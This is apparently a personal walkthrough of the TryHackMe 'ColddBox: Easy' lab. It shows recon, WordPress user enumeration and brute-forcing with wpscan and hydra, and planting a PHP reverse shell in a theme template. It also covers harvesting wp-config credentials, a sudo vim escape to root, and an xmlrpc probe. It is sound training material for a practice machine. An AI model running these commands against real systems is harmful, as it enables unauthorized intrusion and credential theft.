---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . ColddBox: Easy
# DESCRIPTION       . An easy level machine with multiple ways to escalate privileges.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/colddboxeasy
```

```
sudo nmap -sSVC -T5 -p- -oN coldbox 10.10.39.162
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine
|_http-server-header: Apache/2.4.18 (Ubuntu)

4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ebf98c09bc536808c96e8969565973b (RSA)
|   256 8817f1a844f7f8062fd34f733298c7c5 (ECDSA)
|_  256 f2fc6c750820b1b2512d94d694d7514f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
ffuf -u http://10.10.39.162/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 100
```

```
hidden                  [Status: 301, Size: 313, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 317, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 318, Words: 20, Lines: 10]
xmlrpc.php              [Status: 200, Size: 42, Words: 6, Lines: 1]
```

- Alright, so we have some interesting results.
- `/hidden` directory gives us a list of possible usernames in the form of a message on the `index.html` page.

```
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

- Alright, back to the main page. By inspecting the source code, we can see the wordpress version used

```
<meta name="generator" content="WordPress 4.1.31" />
```

- Alright. Technically, we could assume that the users are `hugo`, `philip` and `c0ldd`, but let's use `wpscan` to see what it finds.

```
wpscan --url http://10.10.39.162 -e
```

```
User(s) Identified:

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

- Alright. We also have the login panel in `/wp-admin/` directory, so let's brute-force it.

- We can use either `hydra` or `wpscan`.

**WPSCAN** 

```
wpscan --url http://10.10.39.162 -U philip,c0ldd,hugo -P /usr/share/wordlists/rockyou.txt
```

```
+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - c0ldd / {redacted}   
```

**HYDRA**

```
sudo hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.39.162 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location" -t 64
```

```
[80][http-post-form] host: 10.10.39.162   login: c0ldd   password: {redacted}
```

**NOTE**: `users.txt` is a file containing our usernames, each on a separate line.

- Alright. So we have credentials for the `/wp-admin` page.

- After logging in, the most obvious way for me to escalate my access to the server was to edit one of the existing `.php` pages with a reverse shell.

- So I went to `Appearance -> Editor` and on the right hand side of the screen we see `Templates`.

- Here, I chose to edit the `404 Template` which is the content displayed when the `404` error occurs.

- I replaced the existing code with pentestmonkey's PHP reverse shell code and accessed it via `ip/wp-content/themes/twentyfifteen/404.php` after setting up my listener. 

- Now we're under `www-data` on the server. I know that the `wp-config.php` file is the file that contains the database config of wordpress, so let's take a look here first.

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', '{redacted}');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

- We have the password of the mysql, but the username is `c0ldd`. 
- I tried reading the flag from `/home/c0ldd/user.txt` and I don't have permissions, so I assume we must escalate privileges first to `c0ldd` and then root.

- The user `c0ldd` has the same password as in the config for his own account - `su c0ldd`

```
sudo -l

(root) /usr/bin/vim
(root) /bin/chmod
(root) /usr/bin/ftp
```

- We can use any of these binaries to escalate privileges to root.

- I chose vim since I knew the command from the top of my head, but you can check GTFObins to see how to escalate privileges using each one of them

```
sudo /usr/bin/vim

<ESC>
:!/bin/bash
<ENTER>
```

- The user flag is in `/home/c0ldd/user.txt
- The root flag is in `/root/root.txt`

**NOTE**: I identified multiple ways to get on this system.

- First of all the `xml-rpc.php` file is exposed, which, was previously used as a way for programs / apps to interact with wordpress; 

- This can be further abused to result in a DoS or to bruteforce credentials, depending on what methods we find active by sending the methodCall below

```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

- However, I didn't had time to try this too, so, if this isn't updated, consider this a reminder for future self.

- Also, after getting access to the `wp-admin` panel, you could technically upload a custom `PHP plugin` that would allow RCE, thus, leading to another way of gaining access on the system.

